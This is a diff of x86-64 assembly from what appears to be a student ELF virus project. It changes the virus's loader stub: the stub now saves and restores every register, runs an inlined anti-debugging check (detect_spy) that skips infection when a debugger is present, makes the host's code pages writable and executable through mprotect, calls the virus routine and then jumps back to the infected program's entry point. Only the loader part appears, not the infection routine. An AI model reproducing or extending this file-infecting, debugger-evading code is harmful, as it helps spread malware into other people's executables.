@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2020/01/02 21:21:07 by anselme          ###   ########.fr        ;
+;    Updated: 2020/01/02 22:01:47 by anselme          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -42,11 +42,23 @@ virus_header_struct:
 ;
 ; The code from mark_below to
 mark_below:
-	pop rax
-	push rdx                   ; backup rdx
+	pop r12
+	push rbx                   ; backup rbx
+	push r12                   ; backup r12
+	push r13                   ; backup r13
 	push r14                   ; backup r14
+	push r15                   ; backup r15
 
-	mov rdx, rax
+	push rdi                   ; backup rdi
+	push rsi                   ; backup rsi
+	push rdx                   ; backup rdx
+	push rcx                   ; backup rcx
+	push r8                    ; backup r8
+	push r9                    ; backup r9
+	push r10                   ; backup r10
+	push r11                   ; backup r11
+
+	mov rdx, r12
 
 	mov r8, rdx
 	mov r9, rdx
@@ -64,21 +76,21 @@ mark_below:
 	mov r11, [r11]
 	mov r14, [r14]
 
-	mov rax, rdx               ; get loader_entry addr
-	sub rax, virus_header_struct - loader_entry
+	mov r12, rdx               ; get loader_entry addr
+	sub r12, virus_header_struct - loader_entry
 
-	mov rcx, rax
+	mov rcx, r12
 	xchg rcx, r8
-	sub r8, rcx                ; r8 = rax - r8
-	mov rcx, rax
+	sub r8, rcx                ; r8 = r12 - r8
+	mov rcx, r12
 	xchg rcx, r10
-	add r10, rcx               ; r10 = rax + r10
-	mov rcx, rax
+	add r10, rcx               ; r10 = r12 + r10
+	mov rcx, r12
 	xchg rcx, r11
-	sub r11, rcx               ; r11 = rax - r11
+	sub r11, rcx               ; r11 = r12 - r11
 
 	push r14                   ; save virus size    [rsp + 48]
-	push rax                   ; save loader_entry  [rsp + 40]
+	push r12                   ; save loader_entry  [rsp + 40]
 	push r8                    ; save ptld addr     [rsp + 32]
 	push r9                    ; save ptld size     [rsp + 24]
 	push r10                   ; save virus addr    [rsp + 16]
@@ -90,8 +102,9 @@ mark_below:
 after_woody:
 %endif
 ;------------------------------; check if client behaves well
-	jmp wrap_anti_debug
-after_anti_debug:
+	call detect_spy
+	test rax, rax
+	jnz return_to_client
 ;------------------------------; make ptld writable
 	jmp wrap_mprotect
 after_mprotect:
@@ -104,22 +117,32 @@ after_mprotect:
 	call virus
 ;------------------------------; return to client entry
 return_to_client:
-	mov r11, [rsp + 8]         ; get entry addr
+	mov rax, [rsp + 8]         ; get entry addr
 	add rsp, 56                ; restore stack as it was
-	pop r14                    ; restore r14
-	pop rdx                    ; restore rdx
-	push r11
+
+	pop r11                    ; backup r11
+	pop r10                    ; backup r10
+	pop r9                     ; backup r9
+	pop r8                     ; backup r8
+	pop rcx                    ; backup rcx
+	pop rdx                    ; backup rdx
+	pop rsi                    ; backup rsi
+	pop rdi                    ; backup rdi
+
+	pop r15                    ; backup r15
+	pop r14                    ; backup r14
+	pop r13                    ; backup r13
+	pop r12                    ; backup r12
+	pop rbx                    ; backup rbx
+
+	push rax
 	ret
+
+
 
 end_of_reg_permutable_code:
 ;------------------------------;
 ; Non reg-permutable procedures
-;------------------------------; anti-debug wrapper
-wrap_anti_debug:
-	call detect_spy
-	test rax, rax
-	jnz return_to_client
-	jmp after_anti_debug
 ;------------------------------; mprotect wrapper
 wrap_mprotect:
 	;mprotect(ptld_addr, ptld_size, PROT_READ | PROT_WRITE | PROT_EXEC);
